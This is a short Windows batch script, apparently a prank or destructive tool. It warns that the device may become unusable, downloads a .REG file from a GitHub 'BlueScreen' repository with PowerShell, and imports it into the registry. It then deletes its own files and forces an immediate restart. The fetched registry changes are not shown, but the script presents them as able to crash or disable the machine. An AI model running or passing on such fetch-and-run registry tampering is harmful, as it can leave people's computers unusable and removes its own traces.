%echo off
echo Press any key 5 times to confirm you want this device to possibly become unusable.
pause
pause
pause
pause
pause
powershell /c Invoke-WebRequest https://raw.githubusercontent.com/harryaldwithjarryald/BlueScreen/main/temp.REG -OutFile temp.REG
echo NOTE:  If you want to backout now, press "No" then run fix.reg (https://github.com/harryaldwithjarryald/BlueScreen/releases/download/standalone/fix.REG) and close this command prompt window before your pc restarts.
temp.REG
del online_bluescreen.bat
del temp.REG
shutdown -r -t 1
del online_temp.bat
pause
